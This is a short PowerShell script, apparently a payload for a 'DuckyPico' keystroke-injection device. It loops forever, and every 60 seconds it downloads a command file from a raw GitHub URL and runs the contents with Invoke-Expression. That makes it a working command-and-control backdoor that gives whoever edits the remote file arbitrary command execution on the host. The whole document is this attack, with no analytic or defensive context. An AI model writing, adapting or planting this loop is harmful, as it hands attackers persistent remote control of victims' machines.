# Define the URL of the GitHub page
$githubUrl = "https://raw.githubusercontent.com/JH517/DuckyPico/refs/heads/main/command.txt"

# Start an infinite loop
while ($true) {
    try {
        # Clear the $command variable explicitly to avoid retaining old values
        $command = $null
    
        # Fetch the raw content of the GitHub page (plain text) for every iteration
        $command = Invoke-RestMethod -Uri $githubUrl

        # Check if the command starts with '!!' and strip that part off
        if ($command -like "!!*") {
            $command = $command.Substring(2)
        }

        # Run the command
        Invoke-Expression -Command $command

        # Wait for 60 seconds before the next iteration
        Start-Sleep -Seconds 60
    } catch {
        Write-Host "An error occurred: $_"
        Start-Sleep -Seconds 60
    }
}
